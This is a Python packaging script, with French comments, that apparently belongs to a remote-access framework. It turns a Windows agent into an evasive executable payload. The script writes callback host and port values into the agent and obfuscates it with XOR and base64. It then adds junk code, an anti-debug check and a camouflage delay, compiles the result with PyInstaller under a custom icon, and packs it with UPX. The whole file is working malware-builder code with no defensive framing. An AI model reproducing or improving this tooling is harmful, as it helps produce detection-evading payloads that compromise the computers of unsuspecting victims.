# build/packager.py

import os
import random
import string
import subprocess
import base64
import time

# 📦 Import config globale
try:
    from core.config import LHOST, LPORT
except:
    LHOST, LPORT = "127.0.0.1", 4444  # fallback si .env non chargé

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
AGENT_FILE = os.path.join(BASE_DIR, "agents", "windows", "agent_win.py")
WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
ICON_PATH = os.path.join(BASE_DIR, "assets", "win_ico.ico")
UPX_PATH = r"C:\Tools\upx-5.0.2-win64\upx.exe"
os.makedirs(OUTPUT_DIR, exist_ok=True)

XOR_KEY = 13  # Peut être remplacé par AES
RANDOM_DELAY = random.randint(3, 12)  # Pour camouflage

def random_string(length=10):
    first = random.choice(string.ascii_letters)  # Première lettre valide
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest

def xor_encrypt(data, key):
    return ''.join([chr(ord(c) ^ key) for c in data])

def polymorphic_wrapper(template: str) -> str:
    """Ajoute des commentaires aléatoires, des variables inutiles (junk)"""
    junk = "\n".join([f"{random_string(5)} = '{random_string(6)}'" for _ in range(10)])
    anti_dbg = "import sys\nif sys.gettrace(): exit()\n"  # Anti-debug simple
    return anti_dbg + "\n" + junk + "\n" + template

def inject_wrapper(encoded_payload, xor_key):
    with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
        template = f.read()

    # Injection des données
    wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
    wrapper_final = wrapper_final.replace("XOR_KEY = 13", f"XOR_KEY = {xor_key}")

    # Polymorphisme (junk + anti-debug)
    wrapper_final = polymorphic_wrapper(wrapper_final)

    with open(WRAPPER_OUTPUT, "w", encoding="utf-8") as f:
        f.write(wrapper_final)

    print("[✔] Wrapper injecté avec polymorphisme et protections.")

def compile_exe(output_name="payload_windows.exe", icon_path=ICON_PATH, compress=True):
    cmd = [
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--clean",
        "--name", output_name.replace(".exe", ""),
        "--distpath", OUTPUT_DIR,
        WRAPPER_OUTPUT
    ]

    if icon_path and os.path.exists(icon_path):
        cmd += ["--icon", icon_path]
        print(f"[✔] Icône utilisée : {icon_path}")
    else:
        print("[!] Icône manquante, compilation sans icône.")

    print("[*] Compilation avec PyInstaller...")
    subprocess.run(cmd, check=True)

    exe_path = os.path.join(OUTPUT_DIR, output_name)

    if compress and os.path.exists(exe_path):
        print("[*] Compression UPX avec --force...")
        try:
            subprocess.run([UPX_PATH, "--best", "--lzma", "--force", exe_path], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[❌] Erreur UPX : {e}")
        else:
            print("[✔] Compression UPX terminée.")

    print(f"[✔] Payload final : {exe_path}")

def main():
    print("[*] Délai aléatoire (camouflage) :", RANDOM_DELAY, "secondes")
    time.sleep(RANDOM_DELAY)

    print("[*] Lecture de l'agent...")
    with open(AGENT_FILE, "r", encoding="utf-8") as f:
        code = f.read()

    # 🔁 Insertion dynamique LHOST / LPORT
    code = code.replace("LHOST_PLACEHOLDER", f'"{LHOST}"')
    code = code.replace("LPORT_PLACEHOLDER", f"{LPORT}")

    print("[*] Chiffrement XOR + base64...")
    encrypted = xor_encrypt(code, XOR_KEY)
    encoded = base64.b64encode(encrypted.encode()).decode()

    print("[*] Injection du wrapper polymorphe...")
    inject_wrapper(encoded, XOR_KEY)

    print("[*] Compilation...")
    compile_exe()

    print("[✔] Fichier généré dans : build/output/")
    print("[ℹ️] Aucun fichier ni dossier n'a été supprimé.")

if __name__ == "__main__":
    main()
